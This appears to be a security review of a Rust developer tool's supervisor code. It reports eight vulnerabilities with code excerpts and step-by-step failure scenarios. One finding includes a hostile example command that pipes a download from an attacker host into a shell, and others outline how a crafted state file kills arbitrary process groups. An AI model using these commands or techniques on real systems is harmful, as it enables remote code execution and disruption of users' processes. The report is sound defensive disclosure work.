### Executive Summary & Impact

A security and threat surface review of Phase 50 ("Addressable Monitor Liveness") identified 8 confirmed vulnerabilities across trust boundary enforcement, process-group signaling safety, gate hook execution, and lifecycle guard logic.

The most critical defect allows an untrusted repository checkout or a compromised AI agent subprocess to cause DevFlow's stale-socket backstop (`devflow stop`) to terminate an arbitrary user process group (such as an IDE, terminal multiplexer, or background service) and delete arbitrary files by writing untrusted paths into `.devflow/state-{phase}.json`. Additionally, unvalidated state fields permit remote/arbitrary command execution via gate notification hooks and cross-project supervisor termination.

---

### Finding 1: Arbitrary Process Group Termination and File Deletion via Untrusted `state.supervisor.socket_path`

* **Severity:** Critical
* **Status:** CONFIRMED (Traced in code)
* **Location:** 
  * [`crates/devflow-cli/src/commands.rs:2294-2298`](crates/devflow-cli/src/commands.rs#L2294-L2298)
  * [`crates/devflow-core/src/supervisor/backstop.rs:482-486, 529-532, 636-644`](crates/devflow-core/src/supervisor/backstop.rs#L482-L486)
  * [`crates/devflow-core/src/supervisor.rs:76-88, 645-657`](crates/devflow-core/src/supervisor.rs#L76-L88)

* **Code:**
  [`crates/devflow-cli/src/commands.rs:2294-2298`](crates/devflow-cli/src/commands.rs#L2294-L2298):
  ```rust
  Ok(state) => {
      return Ok(state.supervisor.map(|record| LocatedSocket {
          socket: record.socket_path.clone(),
          record: Some(record),
          unloadable_state: None,
      }));
  }
  ```

* **Failure Scenario:**
  1. An attacker provides a hostile repository checkout or a prompt-injected coding agent subprocess edits `.devflow/state-01.json`.
  2. The attacker selects a target process group owned by the victim user (e.g. an IDE, tmux session, or database daemon). On Linux, `/proc/sys/kernel/random/boot_id` is world-readable, and `/proc/<pid>/stat` is readable by any process running under the same UID, allowing the attacker to read the target's `pgrp` and `start_time` (clock ticks since boot).
  3. The attacker populates `.devflow/state-01.json` with `socket_path: "/tmp/victim.sock"`, `agent_pgid: <target_pgid>`, `agent_start_time: <target_start_time>`, and `boot_id: <current_boot_id>`. The attacker also creates an inactive/closed Unix socket at `/tmp/victim.sock` and writes a sidecar at `/tmp/victim.json` with identical fields.
  4. The operator runs `devflow stop --phase 1`.
  5. `commands::locate_phase_socket` extracts `record.socket_path` without validating that it resides inside `cache_dir/sock` or matches the expected project path digest (`crates/devflow-core/src/supervisor.rs:76-88` only checks length <= `SUN_PATH_MAX`).
  6. `supervisor::probe` checks `own_socket_at` (passes because the socket is owned by the current UID), attempts connection, receives `ECONNREFUSED`, and classifies the socket as `Liveness::Stale`.
  7. `stop_stale_socket` reads `/tmp/victim.json` and invokes `backstop::teardown_stale`.
  8. In `backstop::classify`, all identity fields between the sidecar and `state_record` match. `is_original_leader` reads `/proc/<target_pgid>/stat` and verifies that the process exists, belongs to the current user, and has matching `start_time`. `classify` returns `BackstopDecision::LeaderPresentSignal`.
  9. `kill_group` opens a pidfd on the victim process and executes `libc::syscall(SYS_pidfd_send_signal, pidfd, SIGKILL, NULL, PIDFD_SIGNAL_PROCESS_GROUP)`, terminating the victim's process group.
  10. Finally, `remove_launch_files` calls `std::fs::remove_file` on `socket.as_path()` and `socket.sidecar_path()`, unlinking arbitrary file paths ending in `.sock` and `.json`.

* **Verification Limits:** Confirmed through static trace of `locate_phase_socket`, `teardown_stale`, and `kill_group`. This analysis does not test whether an SELinux/AppArmor profile on hardened hosts blocks `pidfd_send_signal` across disparate security contexts.

---

### Finding 2: Cross-Project Supervisor Shutdown via Unvalidated Socket Location

* **Severity:** Critical
* **Status:** CONFIRMED (Traced in code)
* **Location:**
  * [`crates/devflow-cli/src/commands.rs:2418-2425`](crates/devflow-cli/src/commands.rs#L2418-L2425)
  * [`crates/devflow-core/src/supervisor/protocol.rs:215-216`](crates/devflow-core/src/supervisor/protocol.rs#L215-L216)

* **Code:**
  [`crates/devflow-cli/src/commands.rs:2418-2420`](crates/devflow-cli/src/commands.rs#L2418-L2420):
  ```rust
  Ok(supervisor::Liveness::Alive(_)) => match shutdown_supervisor(phase, &located)? {
      ShutdownResult::Ended => true,
      ShutdownResult::Relocate => false,
  ```
  [`crates/devflow-core/src/supervisor/protocol.rs:215`](crates/devflow-core/src/supervisor/protocol.rs#L215):
  ```rust
  rc == 0 && len as usize == expected_len && cred.uid == euid()
  ```

* **Failure Scenario:**
  1. The user has an active, legitimate DevFlow run in Project A with a live supervisor listening at `~/.cache/devflow/sock/<digestA>-01-<launchId>.sock`.
  2. The user switches to untrusted Project B (or an agent subprocess inside Project B runs). Project B's `.devflow/state-01.json` is crafted with `socket_path` pointing to Project A's active socket path (which is easily discovered by listing `~/.cache/devflow/sock/`).
  3. The user runs `devflow stop` in Project B.
  4. `locate_phase_socket` returns Project A's socket. `probe` reports `Liveness::Alive`.
  5. `shutdown_supervisor` connects to Project A's supervisor and transmits `{"op":"shutdown"}\n`.
  6. Project A's supervisor validates incoming connections using `peer_is_same_user(stream)` via `SO_PEERCRED`. Because both Project A and Project B are run by the same user, UID validation succeeds.
  7. Project A's supervisor stops Project A's active agent group, marks the run stopped, and suppresses advance. Untrusted repositories can thus kill and disrupt unrelated DevFlow pipelines across project boundaries.

* **Verification Limits:** Confirmed through code path tracing in `commands.rs` and `protocol.rs`. Does not establish whether socket filenames can be brute-forced if directory listing on `cache_dir/sock` is restricted.

---

### Finding 3: Arbitrary Command Execution via Untrusted `state.gate_notify_cmd`

* **Severity:** High
* **Status:** CONFIRMED (Traced in code)
* **Location:**
  * [`crates/devflow-core/src/gates.rs:494-522`](crates/devflow-core/src/gates.rs#L494-L522)
  * [`crates/devflow-core/src/state.rs:434-440`](crates/devflow-core/src/state.rs#L434-L440)

* **Code:**
  [`crates/devflow-core/src/gates.rs:511-515`](crates/devflow-core/src/gates.rs#L511-L515):
  ```rust
  fn run_notify_command(cmd: &str, phase: PhaseId, stage: Stage, context: &str, unexpected: bool) {
      let output = Command::new("sh")
          .arg("-c")
          .arg(cmd)
  ```
  [`crates/devflow-core/src/gates.rs:494-502`](crates/devflow-core/src/gates.rs#L494-L502):
  ```rust
  pub fn resolve_gate_notify_cmd(
      env: Option<&std::ffi::OsStr>,
      fallback_cmd: Option<&str>,
  ) -> Option<String> {
      match env.map(|value| value.to_str()) {
          Some(Some("")) => None,
          Some(Some(value)) => Some(value.to_owned()),
          Some(None) | None => fallback_cmd.filter(|s| !s.is_empty()).map(str::to_owned),
      }
  }
  ```

* **Failure Scenario:**
  1. An attacker commits a malicious `.devflow/state-01.json` containing:
     `"gate_notify_cmd": "curl -s http://attacker.com/payload | sh"`
  2. The developer clones the repository and runs `devflow resume --phase 1` or `devflow advance`.
  3. Because `DEVFLOW_GATE_NOTIFY_CMD` is unset in the developer's shell environment, `persisted_notify_cmd_after_env` preserves the persisted value from the state file.
  4. When a gate triggers (e.g. preflight gate, validation failure, or approval gate), `fire_gate_notify_with_fallback` passes `state.gate_notify_cmd` to `resolve_gate_notify_cmd`, which selects the untrusted command.
  5. `run_notify_command` executes `sh -c "$cmd"` directly on the host with the developer's full permissions.

* **Verification Limits:** Confirmed through static trace in `gates.rs` and `state.rs`. If the developer explicitly sets `DEVFLOW_GATE_NOTIFY_CMD=""` in their shell, the vulnerability is suppressed.

---

### Finding 4: Live-Run Guard Bypass When State File is Absent

* **Severity:** High
* **Status:** CONFIRMED (Traced in code)
* **Location:** [`crates/devflow-cli/src/commands.rs:3265-3272`](crates/devflow-cli/src/commands.rs#L3265-L3272)

* **Code:**
  [`crates/devflow-cli/src/commands.rs:3265-3272`](crates/devflow-cli/src/commands.rs#L3265-L3272):
  ```rust
  let sockets: Vec<LiveSocket> = match workflow::load_state(project_root, phase) {
      Ok(state) => state
          .supervisor
          .and_then(|record| recorded_live_socket(&record))
          .into_iter()
          .collect(),
      Err(_) if !state_file.exists() => return Ok(()),
      Err(_) => match cache_dir {
  ```

* **Failure Scenario:**
  1. A phase is actively running under an active supervisor and agent process group.
  2. `.devflow/state-{phase}.json` is removed (e.g. accidentally unlinked, pruned by an agent, or not yet created).
  3. The operator runs `devflow start --phase <N>`.
  4. `refuse_launch_over_a_live_run` evaluates line 3271: `Err(_) if !state_file.exists() => return Ok(())`.
  5. It immediately returns `Ok(())`, completely skipping the socket directory sweep (`sweep_for_in`, lines 3274-3289) and the agent PID file check (`agent_pid_from_file`, line 3291).
  6. DevFlow spawns a second concurrent supervisor and agent on the same phase and worktree, causing race conditions, clobbered outputs, and split-brain git commits.

* **Verification Limits:** Confirmed through code flow analysis. This finding applies specifically when the state file does not exist on disk; if the state file exists but is corrupted, the sweep at line 3284 executes.

---

### Finding 5: Client-Side TOCTOU Symlink Hijack in `probe` and `request_shutdown`

* **Severity:** High
* **Status:** CONFIRMED (Traced in code)
* **Location:** 
  * [`crates/devflow-core/src/supervisor.rs:313-322, 690-696`](crates/devflow-core/src/supervisor.rs#L313-L322)
  * [`crates/devflow-core/src/supervisor/protocol.rs:275-293`](crates/devflow-core/src/supervisor/protocol.rs#L275-L293)

* **Code:**
  [`crates/devflow-core/src/supervisor.rs:313-316`](crates/devflow-core/src/supervisor.rs#L313-L316):
  ```rust
  if !own_socket_at(path)? {
      return Ok(Liveness::Gone);
  }
  let stream = match UnixStream::connect(path) {
  ```
  [`crates/devflow-core/src/supervisor.rs:690-696`](crates/devflow-core/src/supervisor.rs#L690-L696):
  ```rust
  if !own_socket_at(path)? {
      return Err(ProbeError::Stat(io::Error::new(
          io::ErrorKind::NotFound,
          format!("no socket at {}", path.display()),
      )));
  }
  let stream = UnixStream::connect(path).map_err(ProbeError::Connect)?;
  ```

* **Failure Scenario:**
  1. `own_socket_at` performs pre-connect checks using `std::fs::symlink_metadata(path)` (`lstat`) to confirm that `path` is a socket file and owned by `protocol::euid()`.
  2. Between `own_socket_at` and `UnixStream::connect(path)`, an attacker who has write access to the containing directory (or in cases where socket paths point to shared directories like `/tmp`) unlinks `path` and replaces it with a symlink pointing to an arbitrary local Unix socket (e.g. belonging to another user daemon or system service).
  3. Unlike file opens with `O_NOFOLLOW`, POSIX `connect()` follows symlinks.
  4. Neither `protocol::ping` nor `supervisor::request_shutdown` validates the peer credentials (`SO_PEERCRED`) on the connected client stream (`peer_is_same_user` is only invoked on the listening server side).
  5. DevFlow connects to the hijacked target socket and sends `{"op":"shutdown"}\n` or `{"op":"ping"}\n`.

* **Verification Limits:** Confirmed through inspection of `probe`, `request_shutdown`, and `ping`. Does not prove exploitability when the socket resides strictly in a `0700` directory owned exclusively by the user with unshared parent paths.

---

### Finding 6: Self-Signaling in `safe_target` and `terminate_child_group`

* **Severity:** Medium
* **Status:** CONFIRMED (Traced in code)
* **Location:** 
  * [`crates/devflow-core/src/supervisor/backstop.rs:276-279`](crates/devflow-core/src/supervisor/backstop.rs#L276-L279)
  * [`crates/devflow-core/src/monitor.rs:2217-2226`](crates/devflow-core/src/monitor.rs#L2217-L2226)

* **Code:**
  [`crates/devflow-core/src/supervisor/backstop.rs:276-279`](crates/devflow-core/src/supervisor/backstop.rs#L276-L279):
  ```rust
  fn safe_target(pgid: u32, caller_pgrp: i32) -> Option<libc::pid_t> {
      let signed = libc::pid_t::try_from(pgid).ok()?;
      (signed > 1 && signed != caller_pgrp).then_some(signed)
  }
  ```
  [`crates/devflow-core/src/monitor.rs:2217-2226`](crates/devflow-core/src/monitor.rs#L2217-L2226):
  ```rust
  if signed <= 1 {
      warn!("idle timeout: refusing to signal group for pid {signed}");
      return false;
  }

  // SAFETY: `signed > 1`, so `-signed < -1` and the two catastrophic
  // targets (`0` = our own group, `-1` = everything) are both excluded.
  unsafe {
      libc::kill(-signed, libc::SIGTERM);
  }
  ```

* **Failure Scenario:**
  1. In `safe_target`, `signed != caller_pgrp` is checked, but `signed != unsafe { libc::getpid() }` is not. In environments where DevFlow is invoked inside a pipeline or subshell where `getpgrp() != getpid()`, DevFlow's own PID is distinct from its process group leader. If a targeted pgid matches DevFlow's PID, the check passes.
  2. In `monitor.rs:2217`, `terminate_child_group` checks only `signed <= 1`, but checks neither `signed == getpid()` nor `signed == getpgrp()`. If `child_pid` fails to detach into a new process group or shares the caller's process group, `libc::kill(-signed, libc::SIGTERM)` sends SIGTERM to the monitor's own process group, killing DevFlow and any parent/sibling shell processes.

* **Verification Limits:** Confirmed through static inspection of boundary checks in `backstop.rs` and `monitor.rs`. Contrast with `runtime.rs:295` which explicitly checks `signed == unsafe { libc::getpgrp() }`.

---

### Finding 7: Permissive Umask Window on Initial `UnixListener::bind`

* **Severity:** Medium
* **Status:** CONFIRMED (Traced in code)
* **Location:** [`crates/devflow-core/src/supervisor.rs:185-190`](crates/devflow-core/src/supervisor.rs#L185-L190)

* **Code:**
  [`crates/devflow-core/src/supervisor.rs:185-190`](crates/devflow-core/src/supervisor.rs#L185-L190):
  ```rust
  let listener = UnixListener::bind(&part)?;
  let linked =
      std::fs::set_permissions(&part, std::fs::Permissions::from_mode(0o600)).and_then(|()| {
          before_link();
          std::fs::hard_link(&part, path.as_path())
      });
  ```

* **Failure Scenario:**
  1. When `UnixListener::bind(&part)` is called, the socket node is created with permissions dictated by the process umask (`0777 & ~umask`, typically `0755` under standard umask `0022`).
  2. DevFlow does not set `umask(0077)` prior to `bind`.
  3. `std::fs::set_permissions` is called only after binding succeeds.
  4. If `DEVFLOW_CACHE_DIR` is pointed to a shared directory (e.g. `/tmp/devflow`), there is an observable time window between `bind` and `set_permissions` where the socket is created with world/group read and execute permissions, allowing other local processes to connect before mode `0600` is applied.

* **Verification Limits:** Confirmed through examination of `publish_with`. In the default configuration where `~/.cache/devflow/sock` is created with mode `0700`, the directory permissions mitigate access, but defense-in-depth on the socket inode itself is not enforced at creation time.

---

### Finding 8: Environment Variable and Cache Path Leakage to Agent Subprocesses

* **Severity:** Low
* **Status:** CONFIRMED (Traced in code)
* **Location:** 
  * [`crates/devflow-core/src/monitor.rs:1459-1463`](crates/devflow-core/src/monitor.rs#L1459-L1463)
  * [`crates/devflow-core/src/git.rs:87-94`](crates/devflow-core/src/git.rs#L87-L94)

* **Code:**
  [`crates/devflow-core/src/monitor.rs:1459-1463`](crates/devflow-core/src/monitor.rs#L1459-L1463):
  ```rust
  let mut agent_cmd = hermetic_command(&spec.program, &spec.workdir);
  strip_notify_env(&mut agent_cmd);
  agent_cmd
      .args(&spec.args)
      .envs(spec.envs.iter().map(|(k, v)| (k.as_str(), v.as_str())))
  ```
  [`crates/devflow-core/src/git.rs:90-93`](crates/devflow-core/src/git.rs#L90-L93):
  ```rust
  for var in REPO_LOCAL_GIT_VARS.iter().chain(ALSO_REDIRECTING_GIT_VARS) {
      cmd.env_remove(var);
  }
  ```

* **Failure Scenario:**
  1. `hermetic_command` scrubs only repository-local git variables (`GIT_DIR`, `GIT_WORK_TREE`, etc.). `strip_notify_env` only removes `DEVFLOW_GATE_NOTIFY_CMD`.
  2. The supervised agent process inherits all remaining environment variables from the `__monitor` supervisor process, which inherited them from the calling environment.
  3. This leaks `DEVFLOW_CACHE_DIR` (disclosing the path to all local supervisor sockets and sidecars), `DEVFLOW_BASE_BRANCH`, and ambient sensitive tokens (`SSH_AUTH_SOCK`, cloud provider credentials, GitHub tokens) to the untrusted AI agent process.

* **Verification Limits:** Confirmed through static trace of environment scrubbing in `monitor.rs` and `git.rs`. Does not assess whether individual agent harnesses (e.g. Docker sandboxes) perform secondary environment isolation.

---

### NOT REVIEWED

All 13 priority files requested in the instructions were read and traced directly in the snapshot:
1. `crates/devflow-core/src/supervisor.rs`
2. `crates/devflow-core/src/supervisor/runtime.rs`
3. `crates/devflow-core/src/supervisor/backstop.rs`
4. `crates/devflow-core/src/supervisor/protocol.rs`
5. `crates/devflow-core/src/monitor.rs`
6. `crates/devflow-core/src/lock.rs`
7. `crates/devflow-core/src/state.rs`
8. `crates/devflow-core/src/gates.rs`
9. `crates/devflow-core/src/agent.rs`
10. `crates/devflow-cli/src/pipeline_launch.rs`
11. `crates/devflow-cli/src/commands.rs`
12. `crates/devflow-cli/src/preflight.rs`
13. `crates/devflow-cli/src/main.rs`

The following non-priority or supporting files changed in Phase 50 were **NOT** reviewed in detail:
- `crates/devflow-cli/src/pipeline_gate.rs` and `crates/devflow-cli/src/pipeline_outcomes.rs`
- `crates/devflow-core/src/doc_check.rs` and `crates/devflow-core/src/recover.rs`
- `crates/devflow-core/src/registry.rs`
- Test suites under `crates/devflow-cli/tests/` (e.g. `supervisor_e2e.rs`, `stop_e2e.rs`, `start_lock_e2e.rs`, `test_home_isolation.rs`) and test fixtures.
